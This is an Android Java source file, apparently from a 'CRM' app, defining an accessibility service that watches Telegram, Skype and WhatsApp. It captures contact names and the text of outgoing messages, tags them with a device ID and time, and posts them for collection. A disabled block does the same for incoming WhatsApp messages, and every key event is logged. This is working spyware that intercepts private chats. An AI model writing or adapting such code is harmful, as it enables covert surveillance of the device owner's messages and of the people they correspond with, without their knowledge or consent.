package com.crm.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.TargetApi;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;


import java.util.ArrayList;
import java.util.List;

import androidx.annotation.NonNull;

import com.crm.app.model.Chat;

import org.greenrobot.eventbus.EventBus;


/**
 * Created by sotsys-014 on 4/10/16.
 */

@TargetApi(Build.VERSION_CODES.DONUT)
public class MyAccessibilityService extends AccessibilityService {
    private final AccessibilityServiceInfo info = new AccessibilityServiceInfo();
    private static final String TAG = "MyAccessibilityService";
    private static final String TAGEVENTS = "TAGEVENTS";
    private String currntApplicationPackage = "";

//    private WindowPositionController windowController;
    private WindowManager windowManager;
    private boolean showWindow = false;

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        int action = event.getAction();
        int keyCode = event.getKeyCode();
        Log.d("Hello", "code: "+keyCode);
        Log.d("Hello", "act: "+action);

        return super.onKeyEvent(event);
    }

    @Override
    public Object getSystemService(@NonNull String name) {
        Log.d("Hello", name);
        return super.getSystemService(name);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        final String sourcePackageName = (String) accessibilityEvent.getPackageName();
        currntApplicationPackage = sourcePackageName;
        PreferenceUtil.setContext(getApplicationContext());

        Log.d(TAG, "sourcePackageName:" + sourcePackageName);
        Log.d(TAG, "parcelable:" + accessibilityEvent.getText().toString());
        Log.d(TAG, "class:" + accessibilityEvent.getClassName());
//        Log.d(TAG, "enter : "+accessibilityEvent.getEventType());
//        EventBus.getDefault().post(new Chat());


        if(sourcePackageName!=null&&sourcePackageName.equals("org.telegram.messenger")){
            if(accessibilityEvent.getClassName()!=null ){
                if(accessibilityEvent.getClassName().toString().equals("org.telegram.ui.LaunchActivity")){
                    PreferenceUtil.setTelegramChat(null);
                    PreferenceUtil.setTeleLastIncomingMessage("");
                    PreferenceUtil.setTeleLastCount(0);
                }
            }
            if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED &&
                    accessibilityEvent.getContentDescription() != null &&
                    accessibilityEvent.getContentDescription().toString().split("\\.").length>=3){
                Chat chat = PreferenceUtil.getTelegramChat();

                if(accessibilityEvent.getContentDescription().toString().split("\\.").length==3){
                    chat.setName(accessibilityEvent.getContentDescription().toString().split("\\.")[0]);
                }else{
                    chat.setName(accessibilityEvent.getContentDescription().toString().split("\\.")[1]);
                }
                PreferenceUtil.setTelegramChat(chat);
            }
            if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED &&
                    accessibilityEvent.getContentDescription() != null &&
                    accessibilityEvent.getContentDescription().toString().equals("Send")){
                Chat chat = PreferenceUtil.getTelegramChat();
                if(PreferenceUtil.getChat().getName()==null){
                    chat.setName("unknown");
                }
                chat.setType("Keluar");
                chat.setTime(utils.getCurrentTime());
                PreferenceUtil.setTelegramChat(chat);
                if(!chat.getMessage().equals("Type a message")&& !chat.getMessage().equals("Voice note recorder")){
                    chat.setMemberDeviceId(PreferenceUtil.getMemberDevice());
                    EventBus.getDefault().post(chat);
                    chat =  PreferenceUtil.getTelegramChat();
                    chat.setMessage(null);
                    PreferenceUtil.setTelegramChat(chat);
                }
            }

            if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED &&
                    accessibilityEvent.getText() != null &&
                    !accessibilityEvent.getText().toString().isEmpty()){
                Chat chat = PreferenceUtil.getTelegramChat();
                chat.setName(accessibilityEvent.getText().toString());
                PreferenceUtil.setTelegramChat(chat);
            }
        }


        if(sourcePackageName!=null&&sourcePackageName.equals("com.skype.raider")){
            if(accessibilityEvent.getClassName()!=null ){
                if(accessibilityEvent.getClassName().toString().equals("com.skype4life.MainActivity")){
                    PreferenceUtil.setSkypeChat(null);
                    PreferenceUtil.setSkypeLastIncomingMessage("");
                    PreferenceUtil.setSkypeLastCount(0);
                }
            }
            if(accessibilityEvent.getSource()!=null&&accessibilityEvent.getSource().getChildCount()>=2&&
                    accessibilityEvent.getSource().getChild(2).getContentDescription()!=null&&
                    accessibilityEvent.getSource().getChild(2).getContentDescription().toString().split(",").length>3&&
                    accessibilityEvent.getSource().getChild(2).getClassName().equals("android.widget.Button")){
                Chat chat = PreferenceUtil.getSkypeChat();

                chat.setName(accessibilityEvent.getSource().getChild(2).getContentDescription().toString().split(",")[0]);
                PreferenceUtil.setSkypeChat(chat);
            }

            if(accessibilityEvent.getClassName() != null &&
                    accessibilityEvent.getClassName().equals("android.widget.EditText")&&
                    accessibilityEvent.getText() !=null&& !accessibilityEvent.getText().toString().isEmpty()){
                Chat chat = PreferenceUtil.getSkypeChat();
                chat.setMessage(accessibilityEvent.getText().toString());
                PreferenceUtil.setSkypeChat(chat);
            }

            if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED&&
                    accessibilityEvent.getClassName()!=null&&
                    accessibilityEvent.getClassName().equals("android.widget.EditText")&&
                    accessibilityEvent.getText()!=null&&
                    accessibilityEvent.getText().equals("Type a message")){
                Log.d(TAG, "enter");

                Chat chat = PreferenceUtil.getSkypeChat();
                if(PreferenceUtil.getChat().getName()==null){
                    chat.setName("unknown");
                }
                chat.setType("Keluar");
                chat.setTime(utils.getCurrentTime());
                PreferenceUtil.setSkypeChat(chat);
                if(!chat.getMessage().equals("Type a message")&& !chat.getMessage().equals("Voice note recorder")){
                    chat.setMemberDeviceId(PreferenceUtil.getMemberDevice());
                    EventBus.getDefault().post(chat);
                    chat =  PreferenceUtil.getSkypeChat();
                    chat.setMessage(null);
                    PreferenceUtil.setSkypeChat(chat);
                }
            }
        }



        if(sourcePackageName!=null&&sourcePackageName.equals("com.whatsapp")){
            if(accessibilityEvent.getClassName()!=null ){
                if(accessibilityEvent.getClassName().toString().equals("com.whatsapp.HomeActivity")){
                    PreferenceUtil.setChat(null);
                    PreferenceUtil.setLastIncomingMessage("");
                    PreferenceUtil.setLastCount(0);
                }
            }
//            if(sourcePackageName!=null && sourcePackageName.equals("com.whatsapp")){
//                if(accessibilityEvent.getClassName().equals("android.widget.ListView")){
//                    if(PreferenceUtil.getChat().getName()!=null&&!PreferenceUtil.getChat().getName().isEmpty()){
//                        AccessibilityNodeInfo source = accessibilityEvent.getSource();
//                        if(source!=null){
//                            if(PreferenceUtil.getLastIncomingMessage().isEmpty()){
//                                PreferenceUtil.setLastCount(getCount(source,getLastIncomingChat(source)));
//
//                                PreferenceUtil.setLastIncomingMessage(getLastIncomingChat(source));
//                            }else{
//                                if(isContainListChat(source,PreferenceUtil.getLastIncomingMessage())&&
//                                        !isRepeat(source, PreferenceUtil.getLastIncomingMessage())){
//                                    PreferenceUtil.setLastIncomingMessage(source.getChild(source.getChildCount()-1).getChild(0).getText().toString());
//                                    Chat chat = PreferenceUtil.getChat();
//                                    if(PreferenceUtil.getChat().getName()==null){
//                                        chat.setName("unknown");
//                                    }
//                                    chat.setMessage(source.getChild(source.getChildCount()-1).getChild(0).getText().toString());
//                                    chat.setType("Masuk");
//                                    chat.setTime(utils.getCurrentTime());
//                                    chat.setMemberDeviceId(PreferenceUtil.getMemberDevice());
//                                    EventBus.getDefault().post(chat);
//                                    chat =  PreferenceUtil.getChat();
//                                    chat.setMessage(null);
//                                    PreferenceUtil.setChat(chat);
//
//                                }
//                            }
//                        }
//                    }
//                }
//            }
            if(accessibilityEvent.getText().size() == 5){
                Chat chat = PreferenceUtil.getChat();
                chat.setName(accessibilityEvent.getText().get(2).toString());
                PreferenceUtil.setChat(chat);
                Log.d(TAG, "Chat clicked");
            }
            Log.d(TAG, "Chat clicked");
            if(accessibilityEvent.getText().toString()!=null&&!accessibilityEvent.getText().toString().replace("[","").replace("]","").isEmpty()&&sourcePackageName.equals("com.whatsapp")){
                String[] splitString = accessibilityEvent.getText().toString().replace("[","").replace("]","").split(",");
                if(splitString.length == 4){
                    Chat chat = PreferenceUtil.getChat();
                    chat.setName(accessibilityEvent.getText().get(0).toString());
                    PreferenceUtil.setChat(chat);
                    Log.d(TAG, "Chat clicked");
                }
                if(splitString.length == 1){
                    if(!accessibilityEvent.getText().get(0).toString().equals("Message") && !accessibilityEvent.getText().get(0).equals("Voice note recorder")&&!accessibilityEvent.getText().get(0).equals("WhatsApp")){
                        Chat chat = PreferenceUtil.getChat();
                        chat.setMessage(accessibilityEvent.getText().get(0).toString());
                        PreferenceUtil.setChat(chat);
                        Log.d(TAG, "Typing");
                    }
                }
            }
            if(accessibilityEvent.getText().toString()!=null&&
                    accessibilityEvent.getText().size()>0&&
                    accessibilityEvent.getText().get(0)!=null&&
                    accessibilityEvent.getText().get(0).toString().equals("Message")&&
                    !PreferenceUtil.isChatEmpty()){
                if(PreferenceUtil.getChat().getMessage()!=null&&!PreferenceUtil.getChat().getMessage().isEmpty()){
                    Log.d(TAG, "enter");

                    Chat chat = PreferenceUtil.getChat();
                    if(PreferenceUtil.getChat().getName()==null){
                        chat.setName("unknown");
                    }
                    chat.setType("Keluar");
                    chat.setTime(utils.getCurrentTime());
                    PreferenceUtil.setChat(chat);
                    if(!chat.getMessage().equals("Type a message")&& !chat.getMessage().equals("Voice note recorder")){
                        chat.setMemberDeviceId(PreferenceUtil.getMemberDevice());
                        EventBus.getDefault().post(chat);
                        chat =  PreferenceUtil.getChat();
                        chat.setMessage(null);
                        PreferenceUtil.setChat(chat);
                    }

                }
            }
        }

        PreferenceUtil.setPrevPackage(sourcePackageName);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
       // Log.d(TAG, "event: " + accessibilityEvent.getClassName());

      /*  if (accessibilityEvent.getEventType() == AccessibilityEvent.CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION) {
            Log.d(TAGEVENTS, "CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            Log.d(TAGEVENTS, "TYPE_WINDOW_STATE_CHANGED");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.CONTENT_CHANGE_TYPE_SUBTREE) {
            Log.d(TAGEVENTS, "CONTENT_CHANGE_TYPE_SUBTREE");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
            Log.d(TAGEVENTS, "CONTENT_CHANGE_TYPE_TEXT");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.INVALID_POSITION) {
            Log.d(TAGEVENTS, "INVALID_POSITION");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.CONTENT_CHANGE_TYPE_UNDEFINED) {
            Log.d(TAGEVENTS, "CONTENT_CHANGE_TYPE_UNDEFINED");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
            Log.d(TAGEVENTS, "TYPE_ANNOUNCEMENT");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT) {
            Log.d(TAGEVENTS, "TYPE_ASSIST_READING_CONTEXT");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_GESTURE_DETECTION_END) {
            Log.d(TAGEVENTS, "TYPE_GESTURE_DETECTION_END");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            Log.d(TAGEVENTS, "TYPE_VIEW_CLICKED");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START) {
            Log.d(TAGEVENTS, "TYPE_TOUCH_EXPLORATION_GESTURE_START");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_GESTURE_DETECTION_START) {
            Log.d(TAGEVENTS, "TYPE_GESTURE_DETECTION_START");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED) {
            Log.d(TAGEVENTS, "TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED) {
            Log.d(TAGEVENTS, "TYPE_VIEW_ACCESSIBILITY_FOCUSED");
        }
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
            Log.d(TAGEVENTS, "TYPE_WINDOWS_CHANGED");
        }*/

//        if (accessibilityEvent.getPackageName() == null || !(accessibilityEvent.getPackageName().equals("com.bsb.hike") || !(accessibilityEvent.getPackageName().equals("com.whatsapp") || accessibilityEvent.getPackageName().equals("com.facebook.orca") || accessibilityEvent.getPackageName().equals("com.twitter.android") || accessibilityEvent.getPackageName().equals("com.facebook.katana") || accessibilityEvent.getPackageName().equals("com.facebook.lite"))))
//            showWindow = false;
//
//        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
//            Log.d(TAGEVENTS, "TYPE_VIEW_TEXT_CHANGED");
//            if (windowController == null)
//                windowController = new WindowPositionController(windowManager, getApplicationContext());
//            showWindow = true;
//            windowController.notifyDatasetChanged(accessibilityEvent.getText().toString(), currntApplicationPackage);
//        } else if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
//            Log.d(TAGEVENTS, "TYPE_WINDOW_STATE_CHANGED:"+accessibilityEvent.getContentDescription());
//
//            if (accessibilityEvent.getPackageName().equals("com.whatsapp") && (accessibilityEvent.getContentDescription() == null || !accessibilityEvent.getContentDescription().equals("Type a message")))
//                showWindow = false;
//            if (accessibilityEvent.getPackageName().equals("com.facebook.katana") && (accessibilityEvent.getText().toString().equals("[What's on your mind?]") || accessibilityEvent.getText().toString().equals("[Search]")))
//                showWindow = false;
//            if (accessibilityEvent.getPackageName().equals("com.twitter.android") && (accessibilityEvent.getText().toString().equals("[What\u2019s happening?]") || accessibilityEvent.getText().toString().equals("[Search Twitter]")))
//                showWindow = false;
//            if (accessibilityEvent.getContentDescription()!=null && (accessibilityEvent.getContentDescription().toString().equals("Textbox in chat thread")))
//                showWindow = true;
//
//
//            //remove window when keyboard closed or user moved from chatting to other things
//            if (windowController != null && !showWindow)
//                windowController.onDestroy();
//        }
    }
    public boolean isContainListChat(AccessibilityNodeInfo nodeInfo, String lastText){
        boolean isContain = false;
        for(int i=0;i<nodeInfo.getChildCount()-1;i++){
            if(nodeInfo.getChild(i).getChildCount()==2){
                if(nodeInfo.getChild(i).getChild(0)!=null){
                    if(nodeInfo.getChild(i).getChild(0).getText()!=null){
                        if(nodeInfo.getChild(i).getChild(0).getText().toString().equals(lastText)){
                            isContain = true;
                        }
                    }
                }
            }
        }
        return isContain;
    }

    public int getCount(AccessibilityNodeInfo nodeInfo, String lastText){
        int count = 0;
        for(int i=nodeInfo.getChildCount()-1;i>0;i--){
            if(nodeInfo.getChild(i).getChildCount()==2){
                if(nodeInfo.getChild(i).getChild(0).getText().toString().equals(lastText)){
//                    isContain = true;
                    count++;
                }else{
                    break;
                }
            }
        }
        return count;
    }

    public boolean isRepeat(AccessibilityNodeInfo nodeInfo, String lastText){
        boolean isRepeat;
        List<String> chats = new ArrayList<>();
        for(int i=0;i<nodeInfo.getChildCount()-1;i++){
            if(nodeInfo.getChild(i).getChildCount()==2){
                chats.add(nodeInfo.getChild(i).getChild(0).getText().toString());
            }
        }
        if(nodeInfo.getChild(nodeInfo.getChildCount()-1).getChildCount()==2){
            if(!PreferenceUtil.getLastIncomingMessage().equals(nodeInfo.getChild(nodeInfo.getChildCount()-1).getChild(0).getText().toString())){
                return false;
            }else{
                if(chats.size()>=2){
                    int count  = getCount(nodeInfo, getLastIncomingChat(nodeInfo));
//                    if(chats.get(chats.size()-1).equals(lastText)&& chats.get(chats.size()-(PreferenceUtil.getLastCount()+1)).equals(lastText)){
                    if(count == PreferenceUtil.getLastCount()){
                        isRepeat = true;
                    }else{
                        isRepeat = false;
                        if(nodeInfo.getChild(nodeInfo.getChildCount()-1).getChild(0).getText().toString().equals(lastText)){
                            PreferenceUtil.setLastCount(PreferenceUtil.getLastCount()+1);
                        }
                    }
                }else{
                    isRepeat = false;
                }
            }
        }else{
            return true;
        }

        return isRepeat;
    }


    private String getLastIncomingChat(AccessibilityNodeInfo nodeInfo){
        String last = "";
        for(int i=0;i<nodeInfo.getChildCount();i++){
            if(nodeInfo.getChild(i).getChildCount()==2){
                if(nodeInfo.getChild(i).getChild(0).getText()!=null){
                    last = nodeInfo.getChild(i).getChild(0).getText().toString();
                }
            }
        }
        return last;
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    public void onServiceConnected() {
        // Set the type of events that this service wants to listen to.
        //Others won't be passed to this service.
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.eventTypes= AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 100;
        info.packageNames = null;
//        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
//        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
//        info.notificationTimeout = 100;

        this.setServiceInfo(info);
    }
}